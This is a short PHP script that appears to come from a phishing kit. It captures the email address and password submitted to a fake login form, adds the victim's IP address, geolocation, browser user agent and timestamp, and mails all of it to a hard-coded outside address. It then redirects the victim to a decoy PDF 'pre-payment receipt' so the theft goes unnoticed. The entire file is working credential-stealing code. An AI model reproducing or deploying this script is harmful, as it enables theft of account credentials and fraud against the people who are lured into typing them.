<?php

require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();
$ddomain = $_POST['domainID'];
$geoplugin->locate();
$date = gmdate ("Y-n-d");
$time = gmdate ("H:i:s");
$random=rand(0,100000000000);
$md5=md5("$random");
$base=base64_encode($md5);
$dst=md5("$base");
$owner =($_POST['email']);
$pass = $_POST['password'];
$own = 'tzseaman@tzseamans.com';
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "=============+ LOGS +=============\n";
$message .= "Email: ".$_POST['email']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "============= [ip] =============\n";
$message .= 	"IP: {$geoplugin->ip}\n";
$message .= 	"City: {$geoplugin->city}\n";
$message .= 	"Region: {$geoplugin->region}\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .= 	"User-Agent: ".$browser."\n";
$message.= "Date Log  : ".$date."\n";
$message.= "Time Log  : ".$time."\n";

$domain = 'auto.pdf';
$subj = "You have a new login!";
$from = "From: $domain<majezie>\n";
if (empty($owner) || empty($pass)) {
header("Location: ./?$dst&login=$owner");
}
else {
mail($own,$subj,$message,$from,$domain);
header("Location: pre-payment receipt.pdf");
}
?>
